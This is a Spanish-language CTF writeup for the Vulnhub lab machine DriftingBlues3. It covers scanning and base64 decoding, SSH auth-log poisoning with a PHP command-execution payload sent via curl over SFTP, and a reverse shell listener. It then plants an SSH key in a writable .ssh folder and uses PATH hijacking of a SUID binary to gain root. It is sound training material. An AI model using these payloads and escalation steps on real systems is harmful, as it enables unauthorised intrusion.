---
title: DriftingBlues 3 Writeup - Vulnhub
date: 2025-01-24
categories: [Writeups, Vulnhub]
tags: [Linux, Vulnhub, CTF, Easy, HTTP, DriftingBlues]
image:
  path: /assets/img/commons/vulnhub/vulnhub.jpg
---

Resolución máquina anterior: [**DriftingBlues2**](https://lvs3c.github.io/posts/DriftingBlues-2/)

¡Saludos!

Continuamos con la serie **DriftingBlues**!

En este writeup, nos sumergiremos en la máquina [**DriftingBlues3**](https://www.vulnhub.com/entry/driftingblues-3,656/) de **Vulnhub**, la cual tiene un nivel de dificultad **fácil** según la plataforma. Se trata de una máquina **Linux** en la cual vamos a estar realizando **enumeración web**, encontrar directorio oculto desencriptando una cadena en base64, pasando por un **log poisoning** para lograr ejecución de código remota y posteriormente lanzarnos una **reverse shell**. Utilizaremos nuestra clave pública de SSH para poder conectarnos con el usuario local, utilizaremos la técnica **PATH Hijacking** sobre un binario para elevar nuestro privilegio como usuario root y obtener las flags del reto.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ arp-scan -I ens32 --localnet --ignoredups
Interface: ens32, type: EN10MB, MAC: 00:0c:29:c4:47:79, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.32     00:0c:29:9b:4f:c3       VMware, Inc.
10.11.12.254    00:50:56:f6:71:b0       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.490 seconds (102.81 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.32
PING 10.11.12.32 (10.11.12.32) 56(84) bytes of data.
64 bytes from 10.11.12.32: icmp_seq=1 ttl=64 time=0.529 ms

--- 10.11.12.32 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.529/0.529/0.529/0.000 ms
```

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.11.12.32 -oG ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 20:49 -03
Nmap scan report for 10.11.12.32
Host is up (0.0042s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:9B:4F:C3 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 6.97 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p22,80 -sCV 10.11.12.32 -oN services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 21:27 -03
Nmap scan report for 10.11.12.32
Host is up (0.00055s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
| http-robots.txt: 1 disallowed entry
|_/eventadmins
MAC Address: 00:0C:29:9B:4F:C3 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.71 seconds
```

El informe de `Nmap` nos revela:
- Puerto `22` servidor `OpenSSH 7.9p1`
- Puerto `80` servidor `Apache 2.4.38`.

### HTTP - 80

Podemos notar que el escaneo de nmap encontró un archivo `robots.txt` con la entrada `/eventadmins`.

Hacemos un reconocimiento de tecnologías con `whatweb`.

```shell
❯ whatweb http://10.11.12.32/
http://10.11.12.32/ [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.11.12.32]
```

Vamos a mirar la web y su código, para ver si encontramos algo oculto.

![code_web](/assets/img/commons/vulnhub/DriftingBlues3/code_web.png){: .center-image }

Analizamos también la web /tickets.html y su código.

![code_tickets](/assets/img/commons/vulnhub/DriftingBlues3/code_tickets.png){: .center-image }

No disponemos de mucha información, con lo que procedemos a realizar un fuzzing de directorios rápido con el script `http-enum` de nmap.

```shell
❯ nmap -p80 --script http-enum 10.11.12.32 -oN webscan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 21:39 -03
Nmap scan report for 10.11.12.32
Host is up (0.00045s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /robots.txt: Robots file
|   /phpmyadmin/: phpMyAdmin
|   /privacy/: Potentially interesting folder
|_  /secret/: Potentially interesting folder
MAC Address: 00:0C:29:9B:4F:C3 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 7.52 seconds
```

Procedemos a ver el archivo robots.txt y su posterior análisis de la url */eventadmins*.

![robots](/assets/img/commons/vulnhub/DriftingBlues3/robots.png){: .center-image }

![eventadmin](/assets/img/commons/vulnhub/DriftingBlues3/eventadmin.png){: .center-image }

Analizamos la url que menciona */littlequeenofspades.html* y observamos una cadena en base64 dentro del código, ya que en la web al estar en blanco no se nota.

![littlequeenofspades](/assets/img/commons/vulnhub/DriftingBlues3/littlequeenofspades.png){: .center-image }

Convertimos dicha cadena en base64 a strings, la cual es otra cadena en base64 y dicha conversión nos devuelve el path */adminsfixit.php*.

```shell
❯ echo aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ== | base64 -d; echo
intruder? L2FkbWluc2ZpeGl0LnBocA==
❯ echo L2FkbWluc2ZpeGl0LnBocA== | base64 -d; echo
/adminsfixit.php
```

Revisamos y estamos frente al archivo de logs `ssh auth`.

![adminsfixit](/assets/img/commons/vulnhub/DriftingBlues3/adminsfixit.png){: .center-image }

Vamos a intentar generar un nuevo registro de logs con nuestro usuario, para validar si nos muestra la entrada.

```bash
❯ ssh lvs3c@10.11.12.32
lvs3c@10.11.12.32: Permission denied (publickey).
```

Analizamos el log nuevamente y vemos la entrada!

Tambień notamos que necesitamos nuestra clave pública de ssh para poder ingresar, es un parámetro a tener en cuenta.

![ssh_lvs3c](/assets/img/commons/vulnhub/DriftingBlues3/ssh_lvs3c.png){: .center-image }

En este punto vamos a intentar envenenar el log de ssh auth.

Algo que llama la atención son las tareas CRON que se ejecutan cada 1 minuto con el usuario root. Esto podría servir cuando logremos ingresar al sistema.

## Explotación

---

Para envenenar el log de ssh podemos hacerlo de varias formas, una de ellas es cargar código php en la parte del nombre de usuario al conectarnos por ssh.

```shell
❯ ssh '<?php system($_GET["cmd"]); ?>'@10.11.12.32
remote username contains invalid characters
```

De esta forma falla, debido a que dicha vulnerabilidad fue solucionada en SSH, podríamos probar enviar la cadena en base64 o bien realizar una llamada por `curl` al servicio `SFTP`.

```bash
curl -u '<?php system($_GET["cmd"]);?>' sftp://10.11.12.32/anything
Enter host password for user '<?php system($_GET["cmd"])':
curl: (67) Authentication failure
```

De esta forma le gustó, verificamos el log nuevamente y encontramos nuestra conexión.

![log_poison](/assets/img/commons/vulnhub/DriftingBlues3/log_poison.png){: .center-image }

Que no muestre nada, significa que nuestro código php será interpretado.

Probamos la ejecución de código remota.

![rce1](/assets/img/commons/vulnhub/DriftingBlues3/rce1.png){: .center-image }
![rce2](/assets/img/commons/vulnhub/DriftingBlues3/rce2.png){: .center-image }

Ya teniendo la ejecución de código remota, procedemos a generarnos la reverse shell, url encodeando el caracter `&` ---> `(%26)` y poniéndonos en escucha de nuestro lado.

![revshell](/assets/img/commons/vulnhub/DriftingBlues3/revshell.png){: .center-image }

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.11.12.10] from (UNKNOWN) [10.11.12.32] 42354
bash: cannot set terminal process group (662): Inappropriate ioctl for device
bash: no job control in this shell
www-data@driftingblues:/var/www/html$
```

## Pivoting de usuario

---

Al ingresar al sistema, nuestro objetivo es encontrar las flags, nos dirigimos al path `/home/` e ingresamos a la carpeta del usuario robertj, pero no podemos listar la flag por falta de permisos.

```bash
www-data@driftingblues:/home/robertj$ ls -la
ls -la
total 16
drwxr-xr-x 3 robertj robertj 4096 Jan  4  2021 .
drwxr-xr-x 3 root    root    4096 Jan  4  2021 ..
drwx---rwx 2 robertj robertj 4096 Jan  4  2021 .ssh
-r-x------ 1 robertj robertj 1805 Jan  3  2021 user.txt
www-data@driftingblues:/home/robertj$ cat user
cat user.txt
cat: user.txt: Permission denied
```

Vemos que sobre el directorio `.ssh` tenemos permisos, si bien no está la clave privada del usuario robertj, podemos subir nuestra clave pública y conectarnos como si fuésemos dicho usuario, al ser una clave autorizada `authorized_keys`. 

Para generar pares de claves `ssh-keygen`.

De nuestro lado compartimos mediante webserver la clave pública.

```bash
❯ pwd
/home/lv/.ssh
❯ ls
󰷖 id_rsa  󰌆 id_rsa.pub   known_hosts
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.11.12.32 - - [25/Jan/2025 11:40:20] "GET /id_rsa.pub HTTP/1.1" 200 -
```

Descargamos del lado de la máquina nuestra clave pública, la renombramos a `authorized_keys` y le damos permiso 777.

```bash
www-data@driftingblues:/home/robertj/.ssh$ wget http://10.11.12.10/id_rsa.pub
wget http://10.11.12.10/id_rsa.pub
--2025-01-25 05:40:20--  http://10.11.12.10/id_rsa.pub
Connecting to 10.11.12.10:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 563 [application/vnd.exstream-package]
Saving to: 'id_rsa.pub'

     0K                                                       100%  131M=0s

2025-01-25 05:40:20 (131 MB/s) - 'id_rsa.pub' saved [563/563]

www-data@driftingblues:/home/robertj/.ssh$ mv id_rsa.pub authorized_keys
mv id_rsa.pub authorized_keys
www-data@driftingblues:/home/robertj/.ssh$ ls
ls
authorized_keys
www-data@driftingblues:/home/robertj/.ssh$
```

Probamos conectarnos por ssh con el usuario robertj desde nuestro parrot, utilizando nuestra clave privada, no la pública!.

```bash
❯ ssh robertj@10.11.12.32 -i ~/.ssh/id_rsa
Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
robertj@driftingblues:~$ id
uid=1000(robertj) gid=1000(robertj) groups=1000(robertj),1001(operators)
robertj@driftingblues:~$
```

## Escalación de privilegios

---

Perfecto, ahora nuestro objetivo son las flags, además elevar nuestros privilegios y convertinos en usuario root.

Flag 1

```bash
robertj@driftingblues:~$ cat user.txt
flag 1/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░░░░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░░▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█
```

Intentamos listar si el usuario tiene permiso sobre el sistema con `sudo -l` pero no.

Siguiente paso, buscar binarios `SUID`.

```bash
robertj@driftingblues:/tmp$ find / -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/passwd
/usr/bin/getinfo
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chsh
```

Llama la atención el binario `getinfo`, el cual procedemos a ejecutar.

```bash
robertj@driftingblues:/tmp$ /usr/bin/getinfo
###################
ip address
###################

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens32: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
    link/ether 00:0c:29:9b:4f:c3 brd ff:ff:ff:ff:ff:ff
    inet 10.11.12.32/24 brd 10.11.12.255 scope global dynamic ens32
       valid_lft 1742sec preferred_lft 1742sec
    inet6 fe80::20c:29ff:fe9b:4fc3/64 scope link
       valid_lft forever preferred_lft forever
###################
hosts
###################

127.0.0.1       localhost
127.0.1.1       driftingblues

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
###################
os info
###################

Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux
```

Si miramos el contenido, el binario ejecuta 3 comandos, los cuales muestram información sobre la ip `ip a`, archivo hosts `cat /etc/hosts` e información del sistema operativo `uname -a`.

```bash
robertj@driftingblues:/tmp$ cat /usr/bin/getinfo
ELF>p@9@8
#g v "setuidputssystem__cxa_finalize__libc_start_mainlibc.so.6GLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTable5ui  ?P88@????CH=F/DH=/H/H9tH/Ht/h%/h%H=i/H5b/H)HH?HHHtH.HfD=)/u/UH=.Ht
                                                         H=
/-h/]{UHH=H=H=H=H=H=]f.AWL=,AVIAUIATAUH-,SL)HtLLDAHH9u[]A\A]A^A_###################
ip address
###################
ip a###################
hosts
###################
cat /etc/hosts###################
os info
###################
uname -a8\T
           l,zRx
```

Lo que podemos a realizar en este punto es un **`PATH Hijacking`** para que el binario cuando llame a `ip` haga referencia a nuestro archivo.

Esto es debido a que el binario *getinfo* no usa rutas absolutas sino relativas para llamar a los binarios, con lo cual podemos modificar la variable de entorno `$PATH`.

Ejemplo:

```bash
robertj@driftingblues:/tmp$ /usr/bin/ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens32: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
    link/ether 00:0c:29:9b:4f:c3 brd ff:ff:ff:ff:ff:ff
    inet 10.11.12.32/24 brd 10.11.12.255 scope global dynamic ens32
       valid_lft 1037sec preferred_lft 1037sec
    inet6 fe80::20c:29ff:fe9b:4fc3/64 scope link
       valid_lft forever preferred_lft forever

robertj@driftingblues:/tmp$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens32: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
    link/ether 00:0c:29:9b:4f:c3 brd ff:ff:ff:ff:ff:ff
    inet 10.11.12.32/24 brd 10.11.12.255 scope global dynamic ens32
       valid_lft 977sec preferred_lft 977sec
    inet6 fe80::20c:29ff:fe9b:4fc3/64 scope link
       valid_lft forever preferred_lft forever
```

Avanzamos con el **PATH Hijacking**, creamos un archivo ip en */tmp* con código para generarnos la bash y obtenemos acceso root.

Flag 2

```bash
robertj@driftingblues:~$ cd /tmp/
robertj@driftingblues:/tmp$ export PATH=/tmp/:$PATH
robertj@driftingblues:/tmp$ echo '/bin/bash' > ip
robertj@driftingblues:/tmp$ chmod +x ip
robertj@driftingblues:/tmp$ /usr/bin/getinfo
###################
ip address
###################

root@driftingblues:/tmp# cd /root
root@driftingblues:/root# ls
root.txt  upit
root@driftingblues:/root# cat root.txt
flag 2/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!
```

`export PATH=/tmp/:$PATH` ---> Esto significa que el sistema va a ir buscando los binarios partiendo como primer directorio */tmp*.

Hope it helps!